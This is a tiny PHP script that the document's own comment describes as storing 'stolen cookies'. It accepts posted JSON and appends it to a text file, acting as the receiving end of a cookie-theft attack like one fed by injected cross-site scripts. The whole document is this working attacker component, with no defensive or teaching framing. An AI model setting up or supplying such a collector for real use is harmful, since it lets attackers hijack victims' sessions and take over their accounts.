<?php
  // Get the posted data
  $postedData = json_decode(file_get_contents("php://input"), true);

  // Store the stolen cookies in a file or database
  $stolenCookiesFile = "test.txt";
  file_put_contents($stolenCookiesFile, print_r($postedData, true), FILE_APPEND);
?>
